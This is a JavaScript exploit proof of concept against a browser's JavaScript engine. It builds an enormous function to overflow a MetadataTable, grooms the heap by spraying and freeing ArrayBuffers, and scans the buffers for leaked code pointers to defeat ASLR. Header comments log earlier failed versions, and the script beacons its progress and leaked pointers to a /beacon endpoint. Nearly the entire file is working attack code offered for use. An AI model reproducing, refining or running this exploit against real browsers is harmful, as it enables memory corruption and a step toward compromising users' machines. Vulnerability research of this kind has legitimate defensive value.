// p504 — MetadataTable overflow: CORRECT approach for ASLR leak
//
// FIXES ALL PRIOR FAILURES:
//   V156: function never called (no CodeBlock created, no sweep)
//   V500: if(0) caused constant folding → zero op_call bytecodes → no overflow
//   V501: pre-spray too heavy → OOM during re-parse
//   V501-chain: chained calls don't reduce AST, still OOM
//   V503: worker-polled but same OOM problem
//
// CORRECT APPROACH (combines p142 proven path + typeof guard):
//   1. Compile function FIRST (lazy parse, ~146MB source, ~0MB AST)
//   2. Free blob parts, revoke URL
//   3. Spray ABs AFTER compile (bait-and-switch, 100 × 100,112B = ~10MB)
//   4. Call function with typeof guard: if(typeof a==="string"){...38M calls...}
//      - Argument is 0 (number) → typeof==="string" is false → block NOT executed
//      - BUT compiler CANNOT constant-fold typeof → bytecodes ARE generated
//      - prepareForExecution → re-parse → bytecodes → MetadataTable overflow
//      - finishCreation → 4.3GB sweep → writes thunk addresses into ABs
//      - Runtime: typeof check fails → skip block → return normally (NO CRASH)
//   5. Scan ABs for thunk pointers → ASLR LEAK
//
// Memory profile (matches p142 which succeeded with COMPILED-OK + CALLING):
//   After compile: ~146MB source (SourceProvider) + 0MB spray
//   After spray:   ~146MB source + 10MB ABs
//   During call:   ~146MB source + 10MB ABs + bytecodes (incremental) ≈ 300MB
//   WELL under 1200MB limit
//
// Beacon prefix: V504-
(function() {
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V504-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + (Date.now() - T0) + 'ms] ' + (body || ''));
    } catch(e) {}
  }
  function hexB(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexB(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═══ PHASE 1: Build function blob (lazy parse, minimal memory) ═══
  var N = 38348816;
  var CHUNK = 4000000;
  var nC = Math.floor(N / CHUNK);
  var rem = N - nC * CHUNK;

  B('BUILD-START', 'N=' + N);

  var rep = 'a();'.repeat(CHUNK);
  var parts = new Array(nC + 3);
  // typeof guard: compiler must generate bytecodes (can't constant-fold typeof)
  // Argument 0 → typeof==="string" is false → block skipped at runtime
  parts[0] = 'window.__v504fn=function(a){if(typeof a==="string"){';
  for (var c = 0; c < nC; c++) parts[1 + c] = rep;
  parts[nC + 1] = 'a();'.repeat(rem);
  parts[nC + 2] = '}window.__v504ok=1;};';
  rep = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  B('BLOB', 'sz=' + blobMB + 'MB');
  parts = null;

  var blobUrl = URL.createObjectURL(blob);
  var sc = document.createElement('script');

  sc.onerror = function() {
    B('SCRIPT-ERR', 'load-failed');
    B('DONE', 'script-error');
  };

  sc.onload = function() {
    var hasFn = !!window.__v504fn;
    B('COMPILED', hasFn ? 'OK' : 'FAIL');

    if (!hasFn) {
      B('DONE', 'no-fn');
      return;
    }

    // Free blob to reclaim memory (SourceProvider still holds 146MB source)
    URL.revokeObjectURL(blobUrl);
    blob = null;
    blobUrl = null;
    sc = null;

    // ═══ PHASE 2: Bait-and-switch AB spray (AFTER compile) ═══
    var BUF_SZ = 100112;
    var SPRAY_N = 100; // Minimal: 10MB total

    var bufs = new Array(SPRAY_N);
    for (var i = 0; i < SPRAY_N; i++) {
      bufs[i] = new ArrayBuffer(BUF_SZ);
    }
    B('SPRAY', 'n=' + SPRAY_N);

    // Transfer first half to create holes at lower addresses
    var xferred = 0;
    for (var i = 0; i < SPRAY_N / 2; i++) {
      try {
        structuredClone(bufs[i], {transfer: [bufs[i]]});
        xferred++;
      } catch(e) {
        if (xferred === 0) { B('XFER-ERR', e.message.substring(0,60)); break; }
      }
      bufs[i] = null;
    }
    B('XFER', 'n=' + xferred);

    // Create views on surviving ABs (higher addresses)
    var views = [];
    for (var i = Math.floor(SPRAY_N / 2); i < SPRAY_N; i++) {
      if (bufs[i] && bufs[i].byteLength === BUF_SZ) {
        views.push(new Uint8Array(bufs[i]));
      }
    }
    B('VIEWS', 'n=' + views.length);

    // ═══ PHASE 3: GC to free transferred backing stores ═══
    setTimeout(function() {
      for (var g = 0; g < 10; g++) {
        var junk = [];
        for (var j = 0; j < 40000; j++) junk.push({x: j});
        junk = null;
      }
      B('GC-DONE');

      var alive = 0;
      for (var v = 0; v < views.length; v++) {
        if (views[v] && views[v].length === BUF_SZ) alive++;
      }
      B('ALIVE', 'n=' + alive);

      // ═══ PHASE 4: Call function → re-parse → finishCreation → sweep ═══
      // MetadataTable (100,112B) fills a freed hole below surviving ABs
      // finishCreation sweeps 4.3GB forward → writes into surviving ABs
      // typeof guard → block skipped → function returns normally
      B('CALLING');

      var callOk = false;
      try {
        window.__v504fn(0); // number arg → typeof==="string" is false → skip block
        callOk = true;
      } catch(e) {
        B('CALL-ERR', (e.message || 'unknown').substring(0, 80));
      }

      B('CALL-DONE', callOk ? 'OK-' + (window.__v504ok ? 'fn-ok' : 'fn-noset') : 'THREW');

      // Free function to reclaim bytecodes
      window.__v504fn = null;

      // Short stabilization
      setTimeout(doScan, 50);
    }, 500);
  };

  document.head.appendChild(sc);
  sc.src = blobUrl;

  // ═══ SCAN: Read AB views for sweep artifacts ═══
  function doScan() {
    B('SCAN-START');

    var hitBufs = 0;
    var leakedPtrs = [];

    for (var vi = 0; vi < views.length; vi++) {
      var view = views[vi];
      if (!view) continue;

      // Quick check first 4096 bytes for any non-zero content
      var hasNZ = false;
      for (var q = 0; q < 4096 && q < view.length; q += 4) {
        if (view[q] | view[q+1] | view[q+2] | view[q+3]) {
          hasNZ = true;
          break;
        }
      }
      // Full scan if first 4K is clean (sweep might start mid-buffer)
      if (!hasNZ) {
        for (var q = 4096; q < view.length && !hasNZ; q += 112) {
          if (view[q] | view[q+1] | view[q+2] | view[q+3]) hasNZ = true;
        }
      }
      if (!hasNZ) continue;

      hitBufs++;

      // Count non-zero bytes
      var nz = 0;
      for (var j = 0; j < view.length; j++) {
        if (view[j] !== 0) nz++;
      }
      B('HIT-' + vi, 'nz=' + nz);

      if (hitBufs > 5) break;

      // Find entry alignment: look for 0xFFFFFFFF at entry+12
      var bestBase = -1, bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase += 4) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= view.length; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }
      B('EBASE-' + vi, 'base=' + bestBase + ',hits=' + bestHits);

      // Extract thunk pointers at entry+24 (THE ASLR LEAK)
      var ptrs = 0;
      for (var eOff = bestBase; eOff + 32 <= view.length && ptrs < 8; eOff += 112) {
        if (u32(view, eOff + 12) !== 0xFFFFFFFF) continue;
        var pOff = eOff + 24;
        // Skip all-zero pointers
        var anyNZ = false;
        for (var b = 0; b < 8; b++) { if (view[pOff + b]) { anyNZ = true; break; } }
        if (!anyNZ) continue;
        var h = hex8(view, pOff);
        B('THUNK-' + ptrs, 'off=' + pOff + ',val=0x' + h);
        if (leakedPtrs.length < 8) leakedPtrs.push(h);
        ptrs++;
      }

      // Extract m_bytecodeIndex at entry+68 (sequential validation)
      var idxs = 0;
      for (var eOff = bestBase; eOff + 72 <= view.length && idxs < 5; eOff += 112) {
        var iOff = eOff + 68;
        var val = u32(view, iOff);
        if (val !== 0 && val !== 0xFFFFFFFF && val < 40000000) {
          B('IDX-' + idxs, 'off=' + iOff + ',val=' + val);
          idxs++;
        }
      }

      // Raw hex dump of first 336 bytes (3 entries) of first hit
      if (hitBufs === 1) {
        var chunks = [];
        for (var off = 0; off + 8 <= 336 && off + 8 <= view.length; off += 8) {
          if (view[off]|view[off+1]|view[off+2]|view[off+3]|
              view[off+4]|view[off+5]|view[off+6]|view[off+7]) {
            chunks.push(off + ':' + hex8(view, off));
          }
        }
        if (chunks.length > 0) B('RAW', chunks.slice(0,15).join(' '));
      }
    }

    B('RESULT', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length + ',views=' + views.length);

    if (leakedPtrs.length > 0) {
      // Validate: all thunk pointers should be similar (same code region)
      var p0 = leakedPtrs[0];
      var prefix = p0.substring(0, 8); // top 4 bytes
      var consistent = 0;
      for (var i = 0; i < leakedPtrs.length; i++) {
        if (leakedPtrs[i].substring(0, 8) === prefix) consistent++;
      }
      B('ASLR-LEAK', 'ptr0=0x' + leakedPtrs[0] + ',total=' + leakedPtrs.length + ',consistent=' + consistent);
    } else if (hitBufs > 0) {
      B('SWEEP-HIT', 'no-ptrs-but-nz-data');
    } else {
      B('NO-HIT', 'all-zero');
    }

    B('DONE', 'hitBufs=' + hitBufs + ',ptrs=' + leakedPtrs.length);
  }
})();
